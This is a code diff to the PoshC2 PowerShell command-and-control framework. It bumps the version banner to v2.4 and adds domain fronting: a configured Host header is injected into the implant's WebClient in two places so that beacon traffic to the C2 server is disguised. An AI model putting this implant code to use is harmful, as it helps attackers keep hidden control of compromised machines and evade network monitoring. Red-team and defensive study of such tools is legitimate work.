@@ -36,6 +36,7 @@ function Implant-Handler
     $defaultbeacon = $c2serverresults.DefaultSleep
     $killdatefm = $c2serverresults.KillDate
     $IPAddress = $c2serverresults.HostnameIP 
+    $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
     $ipv4address = $c2serverresults.HostnameIP
     $serverport = $c2serverresults.ServerPort 
     function startup 
@@ -59,7 +60,7 @@ function Implant-Handler
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v2.3 www.PoshC2.co.uk ==============" -ForegroundColor Green
+            Write-Host "============== v2.4 www.PoshC2.co.uk ==============" -ForegroundColor Green
             Write-Host "===================================================" `n -ForegroundColor Green
 
             foreach ($implant in $dbresults) 
@@ -266,6 +267,8 @@ function Get-Webclient ($Cookie) {
 $wc = New-Object System.Net.WebClient; 
 $wc.UseDefaultCredentials = $true; 
 $wc.Proxy.Credentials = $wc.Credentials;
+$h="'+$domainfrontheader+'"
+if ($h) {$wc.Headers.Add("Host",$h)}
 if ($cookie) {
 $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
 } $wc }
@@ -325,6 +328,8 @@ $username = "'+$username+'"
 $password = "'+$password+'"
 $proxyurl = "'+$proxyurl+'"
 $wc = New-Object System.Net.WebClient;  
+$h="'+$domainfrontheader+'"
+if ($h) {$wc.Headers.Add("Host",$h)}
 if ($proxyurl) {
 $wp = New-Object System.Net.WebProxy($proxyurl,$true); 
 $wc.Proxy = $wp;
